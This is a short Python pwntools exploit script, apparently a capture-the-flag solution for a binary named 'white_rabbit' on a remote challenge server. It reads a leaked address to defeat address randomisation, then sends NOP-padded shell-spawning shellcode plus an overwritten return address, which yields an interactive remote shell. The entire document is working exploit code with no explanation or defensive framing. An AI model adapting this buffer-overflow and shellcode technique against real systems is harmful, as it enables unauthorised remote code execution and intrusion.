#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./white_rabbit')
p = remote('whiterabbit.chal.wwctf.com', 1337)
shellcode = asm(shellcraft.sh())
shellcode = shellcode.ljust(120,b'\x90')
p.recvuntil(b'> ')
leak = int(p.recvline()[:-1],16)
print(hex(leak))

exe.address = leak - exe.sym.main
print(hex(exe.address))
input()
p.sendline(shellcode + p64(0x00000000000010bf+exe.address))


p.interactive()
